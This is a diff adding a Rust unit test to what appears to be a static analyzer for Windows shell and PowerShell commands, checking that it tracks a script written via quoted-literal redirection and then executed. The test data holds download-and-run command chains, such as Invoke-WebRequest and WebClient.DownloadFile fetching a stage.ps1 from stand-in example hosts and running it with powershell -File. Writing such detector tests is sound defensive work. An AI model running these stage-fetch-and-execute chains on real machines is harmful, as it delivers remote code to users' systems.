@@ -18588,6 +18588,24 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn powershell_quoted_literal_redirect_uses_final_redirection_operator() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Write-Output 1 > 0; Invoke-WebRequest https://ps-literal-final-redirect.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "'Write-Output 1 > 0; Invoke-WebRequest https://ps-literal-final-redirect.example/stage.ps1' > C:\Temp\stage.ps1""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell quoted literal redirection split on an inner >: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn powershell_copy_item_preserves_download_provenance() {
         let report = analyze(
             br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-copy-item-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
